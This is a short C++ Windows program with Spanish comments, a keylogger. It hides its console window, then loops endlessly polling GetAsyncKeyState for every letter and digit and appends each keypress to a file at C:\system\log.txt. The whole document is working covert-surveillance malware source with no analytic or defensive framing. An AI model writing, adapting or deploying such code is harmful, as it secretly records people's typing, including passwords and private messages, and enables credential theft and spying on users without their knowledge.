#define _WIN32_WINNT 0x0500
#include <stdio.h>
#include <windows.h>
#include <fstream>
#include <iostream>
using namespace std;
int main()
{     
   HWND hWnd = GetConsoleWindow();
   ShowWindow( hWnd, SW_HIDE );   //Escondemos la pantalla
      
      string i="i";              //Declaramos variables
      string m="m";
      string f="f";
      string s="s";
      string c="c";
      string h="h";
      string o="o";
      string l="l";
      
      string q="q"; 
      string w="w";
      string e="e";
      string r="r";
      string t="t";
      string y="y";
      string u="u"; 
      string p="p";
      string a="a";
      string d="d";
      string g="g";
      string j="j";
      string k="k";
      string z="z";
      string x="x";
      string v="v";
      string b="b";
      string n="n";
      
      string one="1";
      string two="2";
      string three="3";
      string four="4";
      string five="5";
      string six="6";
      string seven="7";
      string eight="8";
      string nine="9";
      string zero="0";
      while (1)
      {      
            ofstream log("C:\\system\\log.txt", ios::app);    
            Sleep(20);    
           if(GetAsyncKeyState('Q')==-32767)
           {log << q;}
           
           if (GetAsyncKeyState('W')==-32767)
           {log << w;}
           
           if (GetAsyncKeyState('E')==-32767)
           {log << e;}
           
           if (GetAsyncKeyState('R')==-32767)
           {log << r;}
           
           if (GetAsyncKeyState('T')==-32767)
           {log << t;}
           
           if (GetAsyncKeyState('Y')==-32767)
           {log << y;}
           
           if (GetAsyncKeyState('U')==-32767)
           {log << u;}
           
           if (GetAsyncKeyState('I')==-32767)
           {log << i;}
           
           if (GetAsyncKeyState('O')==-32767)
           {log << o;}
           
           if (GetAsyncKeyState('P')==-32767)
           {log << p;}
           
           if (GetAsyncKeyState('A')==-32767)
           {log << a;}
           
           if (GetAsyncKeyState('S')==-32767)
           {log << s;}
           
           if (GetAsyncKeyState('D')==-32767)
           {log << d;}
           
           if (GetAsyncKeyState('F')==-32767)
           {log << f;}
           
           if (GetAsyncKeyState('G')==-32767)
           {log << g;}
           
           if (GetAsyncKeyState('H')==-32767)
           {log << h;}
           
           if (GetAsyncKeyState('J')==-32767)
           {log << j;}
           
           if (GetAsyncKeyState('K')==-32767)
           {log << k;}
           
           if (GetAsyncKeyState('L')==-32767)
           {log << l;}
           
           if (GetAsyncKeyState('Z')==-32767)
           {log << z;}
           
           if (GetAsyncKeyState('X')==-32767)
           {log << x;}
           
           if (GetAsyncKeyState('C')==-32767)
           {log << c;}
           
           if (GetAsyncKeyState('V')==-32767)
           {log << v;}
           
           if (GetAsyncKeyState('B')==-32767)
           {log << b;}
           
           if (GetAsyncKeyState('N')==-32767)
           {log << n;}
           
           if (GetAsyncKeyState('M')==-32767)
           {log << m;}
           
           if (GetAsyncKeyState('1')==-32767)
           {log << 1;}
           
           if (GetAsyncKeyState('2')==-32767)
           {log << 2;}
           
           if (GetAsyncKeyState('3')==-32767)
           {log << 3;}
           
           if (GetAsyncKeyState('4')==-32767)
           {log << 4;}
           
           if (GetAsyncKeyState('5')==-32767)
           {log << 5;}
           
           if (GetAsyncKeyState('6')==-32767)
           {log << 6;}
           
           if (GetAsyncKeyState('7')==-32767)
           {log << 7;}
           
           if (GetAsyncKeyState('8')==-32767)
           {log << 8;}
           
           if (GetAsyncKeyState('9')==-32767)
           {log << 9;}
           
           if (GetAsyncKeyState('0')==-32767)
           {log << 0;}
           
           log.close();
      }
      return 0;
}
